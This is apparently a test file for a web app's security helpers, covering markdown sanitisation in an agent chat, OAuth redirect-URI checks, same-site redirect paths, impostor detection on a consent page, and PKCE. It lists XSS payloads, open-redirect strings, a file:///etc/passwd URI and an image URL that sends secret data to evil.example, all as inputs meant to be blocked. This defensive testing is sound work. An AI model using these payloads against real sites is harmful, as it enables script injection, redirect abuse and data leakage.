import { describe, expect, it } from "vitest";
import { renderSafeMarkdown } from "@/lib/safe-markdown";
import { createHash } from "node:crypto";
import { clientIdentity, isSafeRedirectUri, verifyPkce } from "@/lib/oauth";

/** What an HTML parser does to an attribute value: decode entities once. */
function decodeAttribute(v: string): string {
  return v
    .replace(/&#x([0-9a-f]+);?/gi, (_, h) => String.fromCodePoint(parseInt(h, 16)))
    .replace(/&#(\d+);?/g, (_, d) => String.fromCodePoint(Number(d)))
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&amp;/g, "&");
}

describe("agent chat markdown is rendered safely", () => {
  const vectors = [
    "<img src=x onerror=alert(1)>",
    "<script>alert(1)</script>",
    "[x](javascript:alert(1))",
    "[x](&#106;avascript:alert(1))",
    "[x](javascript&#58;alert(1))",
    "[x](JaVa\tScRiPt:alert(1))",
    "[x](data:text/html,<script>alert(1)</script>)",
    "![x](javascript:alert(1))",
    "[x][r]\n\n[r]: javascript:alert(1)",
    "<details open ontoggle=alert(1)>",
    '<a href="javascript:alert(1)">x</a>',
  ];
  it.each(vectors)("neutralises %s", (v) => {
    const html = renderSafeMarkdown(v);
    expect(html).not.toMatch(/<(script|img src=x|details|iframe)/i);
    // Resolve every href/src the way a browser does (decode the attribute's
    // entities once, then parse the URL): only http(s) and mailto may remain.
    for (const m of html.matchAll(/(?:href|src)="([^"]*)"/g)) {
      expect(new URL(decodeAttribute(m[1]), "https://www.postbase.so/agent").protocol).toMatch(/^(https?|mailto):$/);
    }
  });
  it("never loads images: they become links", () => {
    const html = renderSafeMarkdown("![chart](https://evil.example/p?d=secret)");
    expect(html).not.toMatch(/<img/i);
    expect(html).toContain('<a href="https://evil.example/p?d=secret" rel="noopener noreferrer nofollow">chart</a>');
  });
  it("still renders ordinary markdown", () => {
    expect(renderSafeMarkdown("**bold** [ok](https://postbase.so/a?x=1&y=2)")).toContain('<a href="https://postbase.so/a?x=1&amp;y=2">ok</a>');
  });
});

describe("MCP OAuth redirect URIs", () => {
  it.each(["javascript:alert(1)//", "JavaScript:x", "data:text/html,x", "vbscript:x", "http://evil.com/cb", "file:///etc/passwd", "nope"])(
    "rejects %s",
    (u) => expect(isSafeRedirectUri(u)).toBe(false),
  );
  it.each(["https://claude.ai/api/mcp/auth_callback", "http://localhost:33418/cb", "http://127.0.0.1:5000/cb", "http://[::1]:8080/cb", "cursor://anysphere.cursor-mcp/oauth/callback"])(
    "accepts %s",
    (u) => expect(isSafeRedirectUri(u)).toBe(true),
  );
});

import { isSafePath } from "@/lib/safe-path";
import { safeNext } from "@/lib/mfa";

describe("redirect targets stay on Postbase", () => {
  it("refuses paths a browser would treat as another site", () => {
    for (const bad of ["//evil.com", "/\\evil.com", "/\\/evil.com", "/\t/evil.com", "/\n/evil.com", "https://evil.com", "evil.com", "", null, undefined]) {
      expect(isSafePath(bad as string)).toBe(false);
      expect(safeNext(bad as string)).toBe("/calendar");
    }
  });
  it("keeps ordinary paths", () => {
    for (const ok of ["/queue", "/oauth/authorize?client_id=a&redirect_uri=https%3A%2F%2Fx", "/billing#plans"]) {
      expect(isSafePath(ok)).toBe(true);
      expect(safeNext(ok)).toBe(ok);
    }
  });
});

describe("MCP consent page identity", () => {
  it("shows a known logo only when the redirect matches the app", () => {
    expect(clientIdentity("Claude", "https://claude.ai/api/mcp/auth_callback")).toEqual({ logo: "claude", destination: "claude.ai", impostor: false });
    expect(clientIdentity("Claude Code", "http://localhost:33418/callback")).toMatchObject({ logo: "claude-code", destination: "an app on this device" });
    expect(clientIdentity("Cursor", "cursor://anysphere.cursor-mcp/oauth/callback")).toMatchObject({ logo: "cursor", impostor: false });
  });
  it("flags an app that borrows a known name", () => {
    expect(clientIdentity("Claude", "https://evil.example/cb")).toEqual({ logo: null, destination: "evil.example", impostor: true });
    expect(clientIdentity("claude.ai.evil", "https://claude.ai.evil.example/cb")).toMatchObject({ logo: null, impostor: true });
  });
  it("names the destination for unknown apps without a warning", () => {
    expect(clientIdentity("Smithery", "https://auth.smithery.ai/cb")).toEqual({ logo: null, destination: "auth.smithery.ai", impostor: false });
  });
});

describe("PKCE", () => {
  it("accepts S256 only", () => {
    const verifier = "a".repeat(43);
    const challenge = createHash("sha256").update(verifier).digest("base64url");
    expect(verifyPkce(verifier, challenge, "S256")).toBe(true);
    expect(verifyPkce(verifier, verifier, "plain")).toBe(false);
  });
});
